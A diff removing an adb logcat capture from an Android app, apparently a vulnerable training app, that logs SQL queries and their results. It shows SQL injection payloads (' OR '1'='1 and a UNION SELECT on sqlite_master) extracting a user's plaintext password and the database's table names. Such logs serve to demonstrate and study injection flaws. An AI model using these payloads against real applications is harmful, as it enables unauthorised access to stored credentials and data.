@@ -1,7 +1,0 @@
-﻿PS> adb logcat -d -s Query:V QueryResult:E
-11-12 03:58:02.564  9732  9732 E QueryResult: User: (nobody) not found
-11-12 03:58:02.592  9732  9732 V Query   : SELECT * FROM users WHERE username='nobody'
-11-12 03:58:13.307  9732  9732 E QueryResult: Username: (bob) password: (B0b_P4ssw0rd)
-11-12 03:58:13.375  9732  9732 V Query   : SELECT * FROM users WHERE username='' OR '1'='1'
-11-12 03:58:26.494  9732  9732 E QueryResult: Username: (3.32.2) password: (android_metadata,users,sqlite_sequence)
-11-12 03:58:26.510  9732  9732 V Query   : SELECT * FROM users WHERE username='x' UNION SELECT 1,sqlite_version(),group_concat(name) FROM sqlite_master--'
